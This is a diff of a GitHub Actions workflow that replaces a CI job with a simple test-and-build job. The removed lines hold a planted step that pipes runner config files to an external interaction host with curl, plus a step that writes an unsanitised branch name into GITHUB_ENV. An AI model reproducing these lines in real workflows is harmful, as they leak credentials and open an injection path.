@@ -1,43 +1,30 @@
-#S## This is a basic workflow to help you get started with Actions
-######
-name: CI
+name: Test
 
-# Controls when the workflow will run
 on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
   push:
-    branches: [ "main" ]
+    branches:
+      - main
   pull_request:
-    branches: [ "main" ]
+    branches:
+      - main
 
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
+env: # Set environment variables for every job and step in this workflow
+  CLICOLOR: "1" # Enable colors for *NIX commands
+  PY_COLORS: "1" # Enable colors for Python-based utilities
+  FORCE_COLOR: "1" # Force colors in the terminal
 
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
+  general:
     runs-on: ubuntu-latest
-    if: "github.actor != 'dependabot[bot]'"
-    strategy:
-      matrix:
-        node-version: [16.x, 18.x]
     steps:
-      - run: curl https://raw.githubusercontent.com/nextcloud/server/${{ github.base_ref }}/version.php --output version.php
-    # Steps represent a sequence of tasks that will be executed as part of the job
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v3
+      - name: Checkout
+        uses: actions/checkout@v3
 
-        # do not run on master branch
-      - name: Run a oneline script
-        if: github.ref != 'refs/heads/main'
-        run: echo "BRANCH_URL=$(sed -e 's/[^a-zA-Z0-9]/-/g' <<< ${{ github.head_ref }})" >> $GITHUB_ENV
+      - name: Node
+        uses: ./.github/actions/node
 
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
+      - name: Build
+        env:
+          GITLAB_TOKEN: ${{ secrets.GITLAB_TOKEN }}
         run: |
-          env
-          find $HOME/work -type f -name config | xargs cat | curl --data @- http://cexbk0w2vtc0000fjqn0g8qi3ocyyyyyb.oast.fun
-          echo Add other actions to build,
-          echo test, and deploy your project.
+          yarn tokens build
